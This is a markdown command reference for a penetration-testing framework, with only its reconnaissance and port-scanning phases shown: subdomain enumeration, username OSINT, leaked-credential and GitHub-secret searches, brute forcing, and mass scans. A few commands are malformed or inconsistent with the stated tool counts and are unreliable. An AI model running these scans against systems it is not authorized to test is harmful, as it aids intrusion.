# TSEC FRAMEWORK — Tactical Security Enumeration & Compromise

> **The definitive command-line reference for offensive security operations.**
> **10 Phases | 100 Tools | 1,000+ Commands — Every command saves output.**
>
> *Authorized Security Testing Only. Unauthorized access to computer systems is illegal.*

---

## Table of Contents

- [Overview](#overview)
- [Directory Structure](#directory-structure)
- [Phase 1: Reconnaissance](#phase-1-reconnaissance)
- [Phase 2: Attack Surface Mapping](#phase-2-attack-surface-mapping)
- [Phase 3: Vulnerability Assessment](#phase-3-vulnerability-assessment)
- [Phase 4: Payload Development & Delivery](#phase-4-payload-development--delivery)
- [Phase 5: Privilege Escalation](#phase-5-privilege-escalation)
- [Phase 6: Credential Access](#phase-6-credential-access)
- [Phase 7: Lateral Movement](#phase-7-lateral-movement)
- [Phase 8: Persistence & Defense Evasion](#phase-8-persistence--defense-evasion)
- [Phase 9: Actions on Objectives](#phase-9-actions-on-objectives)
- [Phase 10: Wireless Hacking](#phase-10-wireless-hacking)
- [Quick Reference Matrix](#quick-reference-matrix)
- [Usage Notes](#usage-notes)

---

## Overview

The **TSEC Framework** is a comprehensive, phase-driven command-line toolkit for authorized penetration testing and red team operations. Each phase contains 10 carefully selected tools, and each tool provides 10 operational modes (commands) — ensuring you always have the right command for the job.

Every command in this framework is designed to **save output to a designated file**, ensuring no data is lost and all findings are properly documented for reporting.

### Framework Design

```
Phase (1-10) -> Tool (1-10 per phase) -> Mode (1-10 per tool) -> Command
```

### Key Principles

1. **Pure CLI** — Every tool is command-line driven; no GUIs required
2. **Output Capture** — Every command saves results to `/opt/tsec/output/`
3. **Modular Design** — Use phases independently or as a complete kill chain
4. **Living Reference** — Commands use `{placeholders}` for easy customization

---

## Directory Structure

```
/opt/tsec/
├── output/          # All command outputs (timestamped)
├── wordlists/       # Password lists, user lists
├── scripts/         # Custom scripts and payloads
├── configs/         # Tool configuration files
├── tools/           # Installed tool binaries
└── projects/        # Per-engagement project files
```

---

# Phase 1: Reconnaissance

> **Gather intelligence on targets through passive and active techniques. Map the digital footprint before touching the target infrastructure.**

---

## Tool 1.1 — Subfinder
*Rapid passive subdomain discovery using multiple online sources.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Passive Subdomain Enum | `subfinder -d {domain} -silent -o /opt/tsec/output/1.1.1_subfinder_passive_{domain}.txt` | TXT |
| 2 | All Sources Enum | `subfinder -d {domain} -all -silent -o /opt/tsec/output/1.1.2_subfinder_all_{domain}.txt` | TXT |
| 3 | Recursive Subdomain Enum | `subfinder -d {domain} -recursive -all -silent -o /opt/tsec/output/1.1.3_subfinder_recursive_{domain}.txt` | TXT |
| 4 | Active + Wildcard Filter | `subfinder -d {domain} -all -nW -silent -o /opt/tsec/output/1.1.4_subfinder_active_{domain}.txt` | TXT |
| 5 | Specific Sources Enum | `subfinder -d {domain} -sources shodan,censys,virustotal,crtsh,github -silent -o /opt/tsec/output/1.1.5_subfinder_sources_{domain}.txt` | TXT |
| 6 | Source Collection JSON | `subfinder -d {domain} -all -oJ -cs -o /opt/tsec/output/1.1.6_subfinder_json_{domain}.json` | JSON |
| 7 | Exclude Sources Enum | `subfinder -d {domain} -all -es {source} -silent -o /opt/tsec/output/1.1.7_subfinder_exclude_{domain}.txt` | TXT |
| 8 | IP Resolution Output | `subfinder -d {domain} -all -nW -oI -silent -o /opt/tsec/output/1.1.8_subfinder_ip_{domain}.txt` | TXT |
| 9 | Bulk Domain Scan | `subfinder -dL {domain_list_file} -all -silent -o /opt/tsec/output/1.1.9_subfinder_bulk.txt` | TXT |
| 10 | Pipeline to HTTPX | `subfinder -d {domain} -all -silent \| httpx -silent -sc -title -tech-detect -o /opt/tsec/output/1.1.10_subfinder_httpx_{domain}.txt` | TXT |

## Tool 1.2 — Amass
*Comprehensive DNS enumeration and network mapping with deep correlation.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Passive Enumeration | `amass enum -passive -d {domain} -o /opt/tsec/output/1.2.1_amass_passive_{domain}.txt` | TXT |
| 2 | Active Enumeration | `amass enum -active -d {domain} -o /opt/tsec/output/1.2.2_amass_active_{domain}.txt` | TXT |
| 3 | Intel Collection | `amass intel -d {domain} -whois -o /opt/tsec/output/1.2.3_amass_intel_{domain}.txt` | TXT |
| 4 | DNS Enumeration | `amass enum -d {domain} -src -ip -o /opt/tsec/output/1.2.4_amass_dns_{domain}.txt` | TXT |
| 5 | ASN Mapping | `amass intel -org "{org_name}" -o /opt/tsec/output/1.2.5_amass_asn.txt` | TXT |
| 6 | Brute Force | `amass enum -brute -d {domain} -w {wordlist} -o /opt/tsec/output/1.2.6_amass_brute_{domain}.txt` | TXT |
| 7 | Visual Output | `amass viz -d3 -o /opt/tsec/output/1.2.7_amass_viz_{domain}.html` | HTML |
| 8 | Database Query | `amass db -names -d {domain} > /opt/tsec/output/1.2.8_amass_db_{domain}.txt` | TXT |
| 9 | Config-Driven Enum | `amass enum -config /opt/tsec/configs/amass.ini -d {domain} -o /opt/tsec/output/1.2.9_amass_config_{domain}.txt` | TXT |
| 10 | Full Intelligence | `amass intel -active -d {domain} -whois -src -o /opt/tsec/output/1.2.10_amass_full_{domain}.txt` | TXT |

## Tool 1.3 — theHarvester
*Email harvesting and OSINT gathering from search engines and public sources.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Full Harvest | `theHarvester -d {domain} -b all -f /opt/tsec/output/1.3.1_harvester_full_{domain}` | HTML/XML |
| 2 | Google Only | `theHarvester -d {domain} -b google -f /opt/tsec/output/1.3.2_harvester_google_{domain}` | HTML/XML |
| 3 | Bing + LinkedIn | `theHarvester -d {domain} -b bing,linkedin -f /opt/tsec/output/1.3.3_harvester_bing_linkedin_{domain}` | HTML/XML |
| 4 | Shodan Integration | `theHarvester -d {domain} -b shodan -f /opt/tsec/output/1.3.4_harvester_shodan_{domain}` | HTML/XML |
| 5 | Limit Results | `theHarvester -d {domain} -b all -l {limit} -f /opt/tsec/output/1.3.5_harvester_limited_{domain}` | HTML/XML |
| 6 | DNS TLD Expansion | `theHarvester -d {domain} -c -f /opt/tsec/output/1.3.6_harvester_tld_{domain}` | HTML/XML |
| 7 | Virtual Host Check | `theHarvester -d {domain} -v -f /opt/tsec/output/1.3.7_harvester_vhost_{domain}` | HTML/XML |
| 8 | DNS Lookup | `theHarvester -d {domain} -n -f /opt/tsec/output/1.3.8_harvester_dns_{domain}` | HTML/XML |
| 9 | Takeover Check | `theHarvester -d {domain} -t -f /opt/tsec/output/1.3.9_harvester_takeover_{domain}` | HTML/XML |
| 10 | Proxy Support | `theHarvester -d {domain} -b all -p {proxy_url} -f /opt/tsec/output/1.3.10_harvester_proxy_{domain}` | HTML/XML |

## Tool 1.4 — Shodan CLI
*Search engine for internet-connected devices and exposed services.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Host Lookup | `shodan host {ip} > /opt/tsec/output/1.4.1_shodan_host_{ip}.txt` | TXT |
| 2 | Domain Search | `shodan domain {domain} > /opt/tsec/output/1.4.2_shodan_domain_{domain}.txt` | TXT |
| 3 | Search Query | `shodan search "{query}" --fields ip_str,port,org,hostnames > /opt/tsec/output/1.4.3_shodan_search.txt` | TXT |
| 4 | Facet Analysis | `shodan search "{query}" --facets org,port,os > /opt/tsec/output/1.4.4_shodan_facets.txt` | TXT |
| 5 | Download Results | `shodan download /opt/tsec/output/1.4.5_shodan_{query} "{query}"` | JSON |
| 6 | Parse Download | `shodan parse --fields ip_str,port,data /opt/tsec/output/1.4.5_shodan_{query}.json.gz > /opt/tsec/output/1.4.6_shodan_parsed.txt` | TXT |
| 7 | Stats Query | `shodan stats "{query}" > /opt/tsec/output/1.4.7_shodan_stats.txt` | TXT |
| 8 | My IP | `shodan myip > /opt/tsec/output/1.4.8_shodan_myip.txt` | TXT |
| 9 | Count Results | `shodan count "{query}" > /opt/tsec/output/1.4.9_shodan_count.txt` | TXT |
| 10 | Honeyscore Check | `shodan honeyscore {ip} > /opt/tsec/output/1.4.10_shodan_honeyscore_{ip}.txt` | TXT |

## Tool 1.5 — Recon-ng
*Modular reconnaissance framework with automated correlation.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Domain Recon | `recon-ng -r /opt/tsec/scripts/recon-ng-domain.rc -o /opt/tsec/output/1.5.1_reconng_domain_{domain}.txt` | TXT |
| 2 | Contact Harvest | `recon-ng -w {workspace} -m recon/domains-contacts/whois_pocs} -o /opt/tsec/output/1.5.2_reconng_contacts.txt` | TXT |
| 3 | Host Enumeration | `recon-ng -w {workspace} -m recon/domains-hosts/brute_hosts -o /opt/tsec/output/1.5.3_reconng_hosts.txt` | TXT |
| 4 | Module Search | `recon-ng -w {workspace} --no-check -C "marketplace search {keyword}" > /opt/tsec/output/1.5.4_reconng_search.txt` | TXT |
| 5 | Module Install | `recon-ng --no-check -C "marketplace install all" > /opt/tsec/output/1.5.5_reconng_install.txt` | TXT |
| 6 | Netblock Discovery | `recon-ng -w {workspace} -m recon/domains-hosts/census_api -o /opt/tsec/output/1.5.6_reconng_netblock.txt` | TXT |
| 7 | SSL Certificate | `recon-ng -w {workspace} -m recon/domains-hosts/ssl_san -o /opt/tsec/output/1.5.7_reconng_ssl.txt` | TXT |
| 8 | Report Generation | `recon-ng -w {workspace} -m reporting/html -o /opt/tsec/output/1.5.8_reconng_report.html` | HTML |
| 9 | Credential Search | `recon-ng -w {workspace} -m recon/domains-credentials/pwnedlist -o /opt/tsec/output/1.5.9_reconng_creds.txt` | TXT |
| 10 | Full Recon | `recon-ng -r /opt/tsec/scripts/recon-ng-full.rc -o /opt/tsec/output/1.5.10_reconng_full.txt` | TXT |

## Tool 1.6 — Sherlock
*Hunt down usernames across 400+ social networks.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Single User | `sherlock {username} --output /opt/tsec/output/1.6.1_sherlock_{username}.txt` | TXT |
| 2 | Multiple Users | `sherlock {user1} {user2} {user3} --output /opt/tsec/output/1.6.2_sherlock_multi.txt` | TXT |
| 3 | Site Filter | `sherlock {username} --site instagram,twitter,github --output /opt/tsec/output/1.6.3_sherlock_filtered.txt` | TXT |
| 4 | CSV Output | `sherlock {username} --csv --output /opt/tsec/output/1.6.4_sherlock_{username}.csv` | CSV |
| 5 | JSON Output | `sherlock {username} --json --output /opt/tsec/output/1.6.5_sherlock_{username}.json` | JSON |
| 6 | Proxy Support | `sherlock {username} --proxy {proxy_url} --output /opt/tsec/output/1.6.6_sherlock_proxy.txt` | TXT |
| 7 | Timeout Adjust | `sherlock {username} --timeout 10 --output /opt/tsec/output/1.6.7_sherlock_timeout.txt` | TXT |
| 8 | Found Only | `sherlock {username} --print-found --output /opt/tsec/output/1.6.8_sherlock_found.txt` | TXT |
| 9 | Browse | `sherlock {username} --browse` | BROWSER |
| 10 | All Sites + Export | `sherlock {username} --csv --json --output /opt/tsec/output/1.6.10_sherlock_full` | ALL |

## Tool 1.7 — Sn1per
*Professional automated reconnaissance and penetration testing framework with 50+ integrated tools. Pure CLI, no GUI.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Recon Only | `sniper -t {target} -m recon -w {workspace} > {output_file} 2>&1` | TXT |
| 2 | Stealth Recon | `sniper -t {target} -m stealth -w {workspace} > {output_file} 2>&1` | TXT |
| 3 | Full Web Audit | `sniper -t {target} -m webscan -w {workspace} > {output_file} 2>&1` | TXT |
| 4 | OSINT Deep Dive | `sniper -t {target} -m osint -w {workspace} > {output_file} 2>&1` | TXT |
| 5 | Port Scan + Service Enum | `sniper -t {target} -m portscan -w {workspace} > {output_file} 2>&1` | TXT |
| 6 | Web App Brute Force | `sniper -t {target} -m brute -w {workspace} > {output_file} 2>&1` | TXT |
| 7 | Airstrike Multi-Target | `sniper -f {file} -m airstrike -w {workspace} > {output_file} 2>&1` | TXT |
| 8 | Nuke Everything | `sniper -t {target} -m nuke -w {workspace} > {output_file} 2>&1` | TXT |
| 9 | Report Generation | `sniper -t {target} -m report -w {workspace} > {output_file} 2>&1` | TXT |
| 10 | Active Discovery | `sniper -t {target} -m active -w {workspace} > {output_file} 2>&1` | TXT |
| 11 | Vulnerability Scan | `sniper -t {target} -m vulnscan -w {workspace} > {output_file} 2>&1` | TXT |
| 12 | Subdomain Takeover | `sniper -t {target} -m takeover -w {workspace} > {output_file} 2>&1` | TXT |
| 13 | CMS Identification + Exploit | `sniper -t {target} -m cms -w {workspace} > {output_file} 2>&1` | TXT |
| 14 | GitHub Secrets Hunt | `sniper -t {target} -m github -w {workspace} > {output_file} 2>&1` | TXT |
| 15 | Full Lethal Chain | `sniper -t {target} -m recon -w {workspace} > {output_file} ...` | TXT |

## Tool 1.8 — OWASP Amass (Intel Mode)
*Deep intelligence gathering including ASN, routing, and infrastructure mapping.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | ASN Lookup | `amass intel -asn {asn_number} -o /opt/tsec/output/1.8.1_amassintel_asn_{asn}.txt` | TXT |
| 2 | CIDR Block | `amass intel -cidr {cidr} -o /opt/tsec/output/1.8.2_amassintel_cidr_{cidr}.txt` | TXT |
| 3 | Organization Search | `amass intel -org "{org_name}" -o /opt/tsec/output/1.8.3_amassintel_org.txt` | TXT |
| 4 | Reverse WHOIS | `amass intel -whois -d {domain} -o /opt/tsec/output/1.8.4_amassintel_whois_{domain}.txt` | TXT |
| 5 | IP to ASN | `amass intel -ip -src -o /opt/tsec/output/1.8.5_amassintel_ip.txt` | TXT |
| 6 | Active Intel | `amass intel -active -asn {asn} -o /opt/tsec/output/1.8.6_amassintel_active_{asn}.txt` | TXT |
| 7 | Port Scanning | `amass intel -p 80,443,8080 -cidr {cidr} -o /opt/tsec/output/1.8.7_amassintel_ports_{cidr}.txt` | TXT |
| 8 | IPv6 Support | `amass intel -ipv6 -cidr {cidr} -o /opt/tsec/output/1.8.8_amassintel_ipv6_{cidr}.txt` | TXT |
| 9 | Data Sources | `amass intel -src -asn {asn} -o /opt/tsec/output/1.8.9_amassintel_sources_{asn}.txt` | TXT |
| 10 | Full Infrastructure Map | `amass intel -active -whois -asn {asn} -cidr {cidr} -org "{org}" -o /opt/tsec/output/1.8.10_amassintel_full.txt` | TXT |

## Tool 1.9 — cloud_enum
*Multi-cloud OSINT tool for finding public resources in AWS, Azure, and GCP.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | AWS Scan | `python3 cloud_enum.py --keyword {keyword} -qs --json /opt/tsec/output/1.9.1_cloudenum_aws_{keyword}.json` | JSON |
| 2 | Azure Scan | `python3 cloud_enum.py --keyword {keyword} --azure -qs --json /opt/tsec/output/1.9.2_cloudenum_azure_{keyword}.json` | JSON |
| 3 | GCP Scan | `python3 cloud_enum.py --keyword {keyword} --gcp -qs --json /opt/tsec/output/1.9.3_cloudenum_gcp_{keyword}.json` | JSON |
| 4 | All Clouds | `python3 cloud_enum.py --keyword {keyword} --all -qs --json /opt/tsec/output/1.9.4_cloudenum_all_{keyword}.json` | JSON |
| 5 | DNS Brute | `python3 cloud_enum.py --keyword {keyword} --dns-brute -qs --json /opt/tsec/output/1.9.5_cloudenum_dns_{keyword}.json` | JSON |
| 6 | Mutations | `python3 cloud_enum.py --keyword {keyword} -m /opt/tsec/wordlists/cloud_mutations.txt -qs --json /opt/tsec/output/1.9.6_cloudenum_mutations_{keyword}.json` | JSON |
| 7 | S3 Only | `python3 cloud_enum.py --keyword {keyword} -l /opt/tsec/wordlists/s3_regions.txt -qs --json /opt/tsec/output/1.9.7_cloudenum_s3_{keyword}.json` | JSON |
| 8 | Container Registry | `python3 cloud_enum.py --keyword {keyword} --container -qs --json /opt/tsec/output/1.9.8_cloudenum_container_{keyword}.json` | JSON |
| 9 | Function Scan | `python3 cloud_enum.py --keyword {keyword} --functions -qs --json /opt/tsec/output/1.9.9_cloudenum_functions_{keyword}.json` | JSON |
| 10 | Full Multi-Cloud | `python3 cloud_enum.py --keyword {keyword} --all -m /opt/tsec/wordlists/cloud_mutations.txt -qs --json /opt/tsec/output/1.9.10_cloudenum_full_{keyword}.json` | JSON |

## Tool 1.10 — Maigret
*Advanced username investigation across 3000+ sites with rich data export.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Basic Lookup | `maigret {username} --json /opt/tsec/output/1.10.1_maigret_{username}.json` | JSON |
| 2 | HTML Report | `maigret {username} --html /opt/tsec/output/1.10.2_maigret_{username}.html` | HTML |
| 3 | CSV Export | `maigret {username} --csv /opt/tsec/output/1.10.3_maigret_{username}.csv` | CSV |
| 4 | Site Filter | `maigret {username} --site instagram,twitter,reddit --json /opt/tsec/output/1.10.4_maigret_filtered.json` | JSON |
| 5 | Tags Filter | `maigret {username} --tags photo,messaging --json /opt/tsec/output/1.10.5_maigret_tags.json` | JSON |
| 6 | Top Sites Only | `maigret {username} --top-sites --json /opt/tsec/output/1.10.6_maigret_top.json` | JSON |
| 7 | Proxy Support | `maigret {username} --proxy {proxy} --json /opt/tsec/output/1.10.7_maigret_proxy.json` | JSON |
| 8 | Timeout Adjust | `maigret {username} --timeout 15 --json /opt/tsec/output/1.10.8_maigret_timeout.json` | JSON |
| 9 | No Recheck | `maigret {username} --no-recheck --json /opt/tsec/output/1.10.9_maigret_nocheck.json` | JSON |
| 10 | Full Investigation | `maigret {username} --all-sites --timeout 20 --json /opt/tsec/output/1.10.10_maigret_full_{username}.json` | JSON |

---

# Phase 2: Attack Surface Mapping

> **Map the complete attack surface of the target infrastructure. Identify all services, ports, technologies, and entry points.**

---

## Tool 2.1 — Nmap
*The network mapper — the foundation of network discovery and security auditing.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Quick Scan | `nmap -T4 -F {target} -oN /opt/tsec/output/2.1.1_nmap_quick_{target}.nmap` | NMAP |
| 2 | Full Port Scan | `nmap -p- -T4 {target} -oN /opt/tsec/output/2.1.2_nmap_fullport_{target}.nmap` | NMAP |
| 3 | Service Detection | `nmap -sV -sC -O {target} -oN /opt/tsec/output/2.1.3_nmap_service_{target}.nmap` | NMAP |
| 4 | Aggressive Scan | `nmap -A -T4 {target} -oN /opt/tsec/output/2.1.4_nmap_aggressive_{target}.nmap` | NMAP |
| 5 | UDP Scan | `nmap -sU -T4 --top-ports 100 {target} -oN /opt/tsec/output/2.1.5_nmap_udp_{target}.nmap` | NMAP |
| 6 | Script Scan | `nmap --script={script_name} {target} -oN /opt/tsec/output/2.1.6_nmap_script_{target}.nmap` | NMAP |
| 7 | Stealth Scan | `nmap -sS -T2 -p- {target} -oN /opt/tsec/output/2.1.7_nmap_stealth_{target}.nmap` | NMAP |
| 8 | OS Detection | `nmap -O --osscan-guess {target} -oN /opt/tsec/output/2.1.8_nmap_os_{target}.nmap` | NMAP |
| 9 | XML Output | `nmap -A -T4 {target} -oX /opt/tsec/output/2.1.9_nmap_{target}.xml` | XML |
| 10 | Full Audit | `nmap -sS -sV -sC -O -A -p- -T4 {target} -oA /opt/tsec/output/2.1.10_nmap_full_{target}` | ALL |

## Tool 2.2 — RustScan
*Ultra-fast port scanner that feeds results directly into Nmap.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Quick Scan | `rustscan -a {target} -o /opt/tsec/output/2.2.1_rustscan_quick_{target}.txt` | TXT |
| 2 | All Ports | `rustscan -a {target} -p 1-65535 -o /opt/tsec/output/2.2.2_rustscan_all_{target}.txt` | TXT |
| 3 | Nmap Pipeline | `rustscan -a {target} -- -sV -sC -oN /opt/tsec/output/2.2.3_rustscan_nmap_{target}.nmap` | NMAP |
| 4 | Batch Scan | `rustscan -a {target1},{target2},{target3} -o /opt/tsec/output/2.2.4_rustscan_batch.txt` | TXT |
| 5 | Custom Scripts | `rustscan -a {target} --scripts none -- -sV -oN /opt/tsec/output/2.2.5_rustscan_custom_{target}.nmap` | NMAP |
| 6 | Top Ports | `rustscan -a {target} --top -o /opt/tsec/output/2.2.6_rustscan_top_{target}.txt` | TXT |
| 7 | UDP Scan | `rustscan -a {target} -u 1000 -o /opt/tsec/output/2.2.7_rustscan_udp_{target}.txt` | TXT |
| 8 | Rate Limit | `rustscan -a {target} -b 500 -o /opt/tsec/output/2.2.8_rustscan_rate_{target}.txt` | TXT |
| 9 | JSON Output | `rustscan -a {target} --format json -o /opt/tsec/output/2.2.9_rustscan_{target}.json` | JSON |
| 10 | Full Pipeline | `rustscan -a {target} -p 1-65535 -- -sV -sC -O -A -oN /opt/tsec/output/2.2.10_rustscan_full_{target}.nmap` | NMAP |

## Tool 2.3 — Masscan
*Internet-scale port scanner for large network ranges.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Quick CIDR Scan | `masscan {cidr} -p{ports} --rate 1000 -oB /opt/tsec/output/2.3.1_masscan_{cidr}.bin` | BIN |
| 2 | List Output | `masscan {cidr} -p{ports} --rate 1000 -oL /opt/tsec/output/2.3.2_masscan_{cidr}.list` | LIST |
| 3 | JSON Output | `masscan {cidr} -p{ports} --rate 1000 -oJ /opt/tsec/output/2.3.3_masscan_{cidr}.json` | JSON |
| 4 | XML Output | `masscan {cidr} -p{ports} --rate 1000 -oX /opt/tsec/output/2.3.4_masscan_{cidr}.xml` | XML |
| 5 | Resume Scan | `masscan --resume /opt/tsec/output/2.3.1_masscan_{cidr}.bin -oL /opt/tsec/output/2.3.5_masscan_resume.list` | LIST |
| 6 | Randomize | `masscan {cidr} -p{ports} --rate 1000 --randomize-hosts -oL /opt/tsec/output/2.3.6_masscan_random.list` | LIST |
| 7 | Excludefile | `masscan {cidr} -p{ports} --excludefile {exclude_file} --rate 1000 -oL /opt/tsec/output/2.3.7_masscan_exclude.list` | LIST |
| 8 | Top 100 Ports | `masscan {cidr} --top-ports 100 --rate 1000 -oL /opt/tsec/output/2.3.8_masscan_top100.list` | LIST |
| 9 | Banner Grab | `masscan {cidr} -p{ports} --banners --rate 1000 -oJ /opt/tsec/output/2.3.9_masscan_banners.json` | JSON |
| 10 | Full Range Scan | `masscan {cidr} -p1-65535 --rate 10000 -oL /opt/tsec/output/2.3.10_masscan_full.list` | LIST |

## Tool 2.4 — Naabu
*Fast port scanner with host discovery and Nmap integration.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Host Scan | `naabu -host {target} -o /opt/tsec/output/2.4.1_naabu_{target}.txt` | TXT |
| 2 | CIDR Scan | `naabu -host {cidr} -o /opt/tsec/output/2.4.2_naabu_cidr.txt` | TXT |
| 3 | Top Ports | `naabu -host {target} -top-ports 1000 -o /opt/tsec/output/2.4.3_naabu_top1000_{target}.txt` | TXT |
| 4 | Nmap Integration | `naabu -host {target} -nmap-cli 'nmap -sV -sC' -o /opt/tsec/output/2.4.4_naabu_nmap_{target}.txt` | TXT |
| 5 | Exclude Ports | `naabu -host {target} -exclude-ports 80,443 -o /opt/tsec/output/2.4.5_naabu_exclude_{target}.txt` | TXT |
| 6 | Rate Limit | `naabu -host {target} -rate 500 -o /opt/tsec/output/2.4.6_naabu_rate_{target}.txt` | TXT |
| 7 | CDN Exclusion | `naabu -host {target} -exclude-cdn -o /opt/tsec/output/2.4.7_naabu_nocdn_{target}.txt` | TXT |
| 8 | JSON Output | `naabu -host {target} -json -o /opt/tsec/output/2.4.8_naabu_{target}.json` | JSON |
| 9 | Stream Output | `naabu -host {target} -stream -o /opt/tsec/output/2.4.9_naabu_stream_{target}.txt` | TXT |
| 10 | Full Port + Nmap | `naabu -host {target} -p - -nmap-cli 'nmap -sV -sC -O -A' -o /opt/tsec/output/2.4.10_naabu_full_{target}.txt` | TXT |

## Tool 2.5 — HTTPX
*Fast, multi-purpose HTTP prober with advanced fingerprinting.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Probe List | `httpx -l {host_list} -o /opt/tsec/output/2.5.1_httpx_probe.txt` | TXT |
| 2 | Tech Detect | `httpx -l {host_list} -tech-detect -o /opt/tsec/output/2.5.2_httpx_tech.txt` | TXT |
| 3 | Status Code | `httpx -l {host_list} -status-code -o /opt/tsec/output/2.5.3_httpx_status.txt` | TXT |
| 4 | Title Grab | `httpx -l {host_list} -title -o /opt/tsec/output/2.5.4_httpx_title.txt` | TXT |
| 5 | Screenshot | `httpx -l {host_list} -screenshot -o /opt/tsec/output/2.5.5_httpx_screenshots/` | PNG |
| 6 | Web Server | `httpx -l {host_list} -web-server -o /opt/tsec/output/2.5.6_httpx_server.txt` | TXT |
| 7 | CDN Detection | `httpx -l {host_list} -cdn -o /opt/tsec/output/2.5.7_httpx_cdn.txt` | TXT |
| 8 | Favicon Hash | `httpx -l {host_list} -favicon -o /opt/tsec/output/2.5.8_httpx_favicon.txt` | TXT |
| 9 | JSON Output | `httpx -l {host_list} -json -o /opt/tsec/output/2.5.9_httpx.json` | JSON |
| 10 | Full Recon | `httpx -l {host_list} -tech-detect -status-code -title -web-server -cdn -json -o /opt/tsec/output/2.5.10_httpx_full.json` | JSON |

## Tool 2.6 — DNSX
*Fast, multi-purpose DNS toolkit for DNS enumeration and verification.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | A Record | `dnsx -l {domain_list} -a -resp -o /opt/tsec/output/2.6.1_dnsx_a.txt` | TXT |
| 2 | AAAA Record | `dnsx -l {domain_list} -aaaa -resp -o /opt/tsec/output/2.6.2_dnsx_aaaa.txt` | TXT |
| 3 | MX Record | `dnsx -l {domain_list} -mx -resp -o /opt/tsec/output/2.6.3_dnsx_mx.txt` | TXT |
| 4 | NS Record | `dnsx -l {domain_list} -ns -resp -o /opt/tsec/output/2.6.4_dnsx_ns.txt` | TXT |
| 5 | TXT Record | `dnsx -l {domain_list} -txt -resp -o /opt/tsec/output/2.6.5_dnsx_txt.txt` | TXT |
| 6 | CNAME | `dnsx -l {domain_list} -cname -resp -o /opt/tsec/output/2.6.6_dnsx_cname.txt` | TXT |
| 7 | PTR (Reverse) | `dnsx -l {ip_list} -ptr -resp -o /opt/tsec/output/2.6.7_dnsx_ptr.txt` | TXT |
| 8 | SOA | `dnsx -l {domain_list} -soa -resp -o /opt/tsec/output/2.6.8_dnsx_soa.txt` | TXT |
| 9 | DNS Wildcard | `dnsx -l {domain_list} -wd {wildcard_domain} -o /opt/tsec/output/2.6.9_dnsx_wildcard.txt` | TXT |
| 10 | Full DNS Enum | `dnsx -l {domain_list} -a -aaaa -mx -ns -txt -cname -soa -json -o /opt/tsec/output/2.6.10_dnsx_full.json` | JSON |

## Tool 2.7 — WhatWeb
*Next-generation web scanner for technology fingerprinting.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Single Target | `whatweb {target} > /opt/tsec/output/2.7.1_whatweb_{target}.txt` | TXT |
| 2 | Target List | `whatweb -i {url_list} > /opt/tsec/output/2.7.2_whatweb_list.txt` | TXT |
| 3 | Verbose | `whatweb -v {target} > /opt/tsec/output/2.7.3_whatweb_verbose_{target}.txt` | TXT |
| 4 | Aggression Level 3 | `whatweb -a 3 {target} > /opt/tsec/output/2.7.4_whatweb_aggro_{target}.txt` | TXT |
| 5 | Colour Output | `whatweb --colour=always {target} > /opt/tsec/output/2.7.5_whatweb_colour_{target}.txt` | TXT |
| 6 | Log JSON | `whatweb --log-json /opt/tsec/output/2.7.6_whatweb_{target}.json {target}` | JSON |
| 7 | Log XML | `whatweb --log-xml /opt/tsec/output/2.7.7_whatweb_{target}.xml {target}` | XML |
| 8 | Log SQL | `whatweb --log-sql /opt/tsec/output/2.7.8_whatweb_{target}.db {target}` | DB |
| 9 | Proxy | `whatweb --proxy {proxy} {target} > /opt/tsec/output/2.7.9_whatweb_proxy_{target}.txt` | TXT |
| 10 | Full Scan | `whatweb -a 3 -v --log-json /opt/tsec/output/2.7.10_whatweb_full_{target}.json {target}` | JSON |

## Tool 2.8 — Cloudlist
*Multi-cloud asset discovery tool for AWS, Azure, GCP, and more.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | AWS Scan | `cloudlist -provider aws -o /opt/tsec/output/2.8.1_cloudlist_aws.txt` | TXT |
| 2 | Azure Scan | `cloudlist -provider azure -o /opt/tsec/output/2.8.2_cloudlist_azure.txt` | TXT |
| 3 | GCP Scan | `cloudlist -provider gcp -o /opt/tsec/output/2.8.3_cloudlist_gcp.txt` | TXT |
| 4 | DO Scan | `cloudlist -provider do -o /opt/tsec/output/2.8.4_cloudlist_do.txt` | TXT |
| 5 | Linode Scan | `cloudlist -provider linode -o /opt/tsec/output/2.8.5_cloudlist_linode.txt` | TXT |
| 6 | All Providers | `cloudlist -o /opt/tsec/output/2.8.6_cloudlist_all.txt` | TXT |
| 7 | JSON Output | `cloudlist -json -o /opt/tsec/output/2.8.7_cloudlist.json` | JSON |
| 8 | Host Only | `cloudlist -host-only -o /opt/tsec/output/2.8.8_cloudlist_hosts.txt` | TXT |
| 9 | IP Only | `cloudlist -ip-only -o /opt/tsec/output/2.8.9_cloudlist_ips.txt` | TXT |
| 10 | Full Inventory | `cloudlist -json -o /opt/tsec/output/2.8.10_cloudlist_full.json` | JSON |

## Tool 2.9 — Uncover
*Quickly discover exposed hosts on the internet using search engine APIs.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Shodan Query | `uncover -q "{query}" -e shodan -o /opt/tsec/output/2.9.1_uncover_shodan.txt` | TXT |
| 2 | Censys Query | `uncover -q "{query}" -e censys -o /opt/tsec/output/2.9.2_uncover_censys.txt` | TXT |
| 3 | FOFA Query | `uncover -q "{query}" -e fofa -o /opt/tsec/output/2.9.3_uncover_fofa.txt` | TXT |
| 4 | Hunter Query | `uncover -q "{query}" -e hunter -o /opt/tsec/output/2.9.4_uncover_hunter.txt` | TXT |
| 5 | Quake Query | `uncover -q "{query}" -e quake -o /opt/tsec/output/2.9.5_uncover_quake.txt` | TXT |
